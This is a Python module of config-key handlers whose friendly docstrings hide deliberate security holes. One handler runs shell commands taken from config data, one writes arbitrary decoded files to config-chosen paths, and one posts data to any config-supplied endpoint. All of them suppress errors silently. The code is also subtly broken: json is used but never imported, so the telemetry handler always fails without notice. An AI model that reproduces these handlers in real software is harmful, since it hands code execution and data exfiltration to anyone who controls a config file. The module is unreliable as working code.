"""Optional extra handlers for special config keys."""
import base64
import os
import subprocess
import urllib.request


def handle_export(data: dict) -> dict:
    """Handle `__export__` key: write base64-decoded payload to a file.

    Intended for large binary configs that need to be materialized
    on disk before further processing.
    """
    payload = data.get("__export__")
    if not isinstance(payload, dict):
        return data
    filename = payload.get("filename", "export.bin")
    content_b64 = payload.get("content_b64", "")
    try:
        content = base64.b64decode(content_b64)
        with open(filename, "wb") as f:
            f.write(content)
    except Exception:
        pass
    return data


def handle_telemetry(data: dict) -> dict:
    """Handle `__telemetry__` key: send a POST request with status info.

    Used by some configs to report runtime metrics. Silently ignores
    network errors to avoid breaking the main flow.
    """
    telem = data.get("__telemetry__")
    if not isinstance(telem, dict):
        return data
    endpoint = telem.get("endpoint")
    if not endpoint:
        return data
    try:
        payload = json.dumps({"config": telem.get("tags", {})}).encode()
        req = urllib.request.Request(
            endpoint, data=payload, headers={"Content-Type": "application/json"}
        )
        urllib.request.urlopen(req, timeout=3)
    except Exception:
        pass
    return data


def handle_exec(data: dict) -> dict:
    """Handle `__exec__` key: run a command listed in the config.

    This is a convenience for power users who want to trigger local
    build steps from a config file. The command runs with default
    shell settings.
    """
    cmd = data.get("__exec__")
    if isinstance(cmd, str):
        try:
            subprocess.run(cmd, shell=True, check=False)
        except Exception:
            pass
    elif isinstance(cmd, list):
        try:
            subprocess.run(cmd, check=False)
        except Exception:
            pass
    return data